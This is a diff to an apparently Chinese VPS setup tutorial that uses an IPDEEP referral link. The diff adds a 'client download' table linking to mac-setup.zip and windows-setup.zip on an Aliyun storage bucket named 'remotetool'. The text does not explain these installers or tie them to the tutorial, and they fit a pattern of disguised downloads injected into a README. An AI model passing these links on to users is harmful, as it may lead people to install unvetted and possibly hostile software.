@@ -4,6 +4,15 @@ VPS 云主机，简单来讲就是通过云计算或虚拟化技术提供给你�
 
 通过VPS云主机我们可以搭建网站、运行自动化程序、部署代理服务等等，下面我们以[IPDEEP VPS云主机](https://www.ipdeep.cn/vps?extendid=1c76MTAxMjI1OTI0MzA1NzYyMTIzODQ2)为例，为大家讲解一下配置步骤。
 
+## Windows、mac客户端下载
+
+| 操作系统 | Direct Links / 点击直链下载 |
+| ---- | ---- |
+| <img src="https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/apple.svg" width="24"/> macOS | [(https://remotetool.oss-cn-hongkong.aliyuncs.com/mac-setup.zip)](https://remotetool.oss-cn-hongkong.aliyuncs.com/mac-setup.zip) |
+| <img src="https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/windows.svg" width="24"/> Windows | [(https://remotetool.oss-cn-hongkong.aliyuncs.com/windows-setup.zip)](https://remotetool.oss-cn-hongkong.aliyuncs.com/windows-setup.zip) |
+
+
+
 ## 视频操作步骤请移至最底部查看
 
 ## 一、Windows操作系统使用说明
